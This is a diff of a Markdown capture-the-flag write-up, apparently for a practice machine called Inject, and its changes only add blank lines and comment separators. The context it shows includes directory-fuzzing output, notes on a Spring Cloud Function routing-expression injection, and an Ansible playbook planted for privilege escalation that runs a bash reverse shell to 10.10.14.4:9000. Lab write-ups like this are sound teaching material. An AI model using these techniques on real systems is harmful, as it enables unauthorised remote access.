@@ -63,26 +63,42 @@ $ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 
 [Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 29ms]
 | URL | http://10.10.11.204:8080/register
+
     * FUZZ: register
+
+<!-- -->
 
 [Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 116ms]
 | URL | http://10.10.11.204:8080/blogs
+
     * FUZZ: blogs
+
+<!-- -->
 
 [Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 72ms]
 | URL | http://10.10.11.204:8080/upload
+
     * FUZZ: upload
+
+<!-- -->
 
 [Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 316ms]
 | URL | http://10.10.11.204:8080/environment
+
     * FUZZ: environment
+
+<!-- -->
 
 [Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 205ms]
 | URL | http://10.10.11.204:8080/error
+
     * FUZZ: error
+
+<!-- -->
 
 [Status: 200, Size: 1086, Words: 137, Lines: 34, Duration: 118ms]
 | URL | http://10.10.11.204:8080/release_notes
+
     * FUZZ: release_notes
 ```
 
@@ -163,9 +179,12 @@ def scan(txt,cmd):
 ```
 
 Things to note:
+
 - Passing the payload through a specific header: `'spring.cloud.function.routing-expression':payload`
 - The path to send our request to: `path = '/functionRouter'`
 - The method of the request: `req=requests.post`
+
+<!-- -->
 
 ![](ping_test.png)
 
@@ -347,8 +366,10 @@ drwxrwxr-x 2 root staff 4096 Feb  8 18:56 .
 phil@inject:/opt/automation/tasks$ cp playbook_1.yml shell.yml
 phil@inject:/opt/automation/tasks$ nano shell.yml
 phil@inject:/opt/automation/tasks$ cat shell.yml
+
 - hosts: localhost
   tasks:
+
   - name: Checking webapp service
     shell:
       cmd: bash -c 'bash -i >& /dev/tcp/10.10.14.4/9000 0>&1'
